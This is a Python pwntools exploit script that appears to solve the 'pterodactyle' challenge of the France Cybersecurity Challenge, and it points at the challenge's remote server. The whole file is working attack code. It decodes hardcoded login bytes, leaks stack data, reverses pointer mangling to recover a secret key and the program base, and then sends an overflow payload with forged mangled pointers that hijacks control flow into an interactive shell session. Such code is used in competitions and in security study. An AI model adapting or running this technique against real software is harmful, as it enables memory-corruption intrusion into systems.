#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'debug'


# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)

exe = ELF('./pterodactyle')

host, port = "challenges.france-cybersecurity-challenge.fr", "2102"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process(exe.path)

USER = b'\x16\x13\x1a\x1e\x19'
PASS = b'\x3a\x0e\x24\x12\x34\x05\x44\x23\x27\x43\x53\x53\x20\x47\x05\x13'

def ROR(x, n, bits = 64):
    mask = (2**n) - 1
    mask_bits = x & mask
    return (x >> n) | (mask_bits << (bits - n))
 
def ROL(x, n, bits = 64):
    return ROR(x, bits - n, bits)

def decrypt(buff):
  temp = b''
  for c in buff:
    temp += p8(c ^ 0x77)
  return temp

sla('>> ', '1')
USER = decrypt(USER)
sa('>> ', USER)
PASS = decrypt(PASS)
print(hexdump(PASS))

sa('>> ', PASS)

sa('>> ', '2')
p.recvuntil(')\n', drop=True)

buff = p.recv(0x40)
print(hexdump(buff))

stack = u64(buff[0x10:0x18])
logleak('stack', stack)

val1 = u64(buff[0x08:0x10])
val2 = u64(buff[0x30:0x38])
val3 = u64(buff[0x38:0x40])
logleak('val1', val1)
logleak('val2', val2)
logleak('val3', val3)

val1 = ROR(val1,0x11)
val2 = ROR(val2,0x11)
val3 = ROR(val3,0x11)
logleak('val1', val1)
logleak('val2', val2)
logleak('val3', val3)

random = (stack-0x118) ^ val1
random = random & 0xfffffffffffff000
random |= (val3 & 0xfff) ^ 0x31f
logleak('random', random)

val1 = val1 ^ random
val2 = val2 ^ random
val3 = val3 ^ random
logleak('val1', val1)
logleak('val2', val2)
logleak('val3', val3)
exe.address = val3 - 0x131f
logleak('prog base', exe.address)

sa('>> ', '3')
payload = b'\x16\x13\x1a\x1e\x19'+b'\x00\x00'+b'A'*0x18
payload += b'A'*9 + p64( ROL((stack ^ random),0x11))
payload += b'A'*0x20 + p64(( ROL((stack ^ random),0x11))) + p64( ROL(((exe.address+0x1595) ^random),0x11))
sla('>> ', '1')
USER = decrypt(payload)
sa('>> ', USER)

PASS = b'\x3a\x0e\x24\x12\x34\x05\x44\x23\x27\x43\x53\x53\x20\x47\x05\x13'
PASS = decrypt(PASS)
sa('>> ', PASS)

p.interactive()

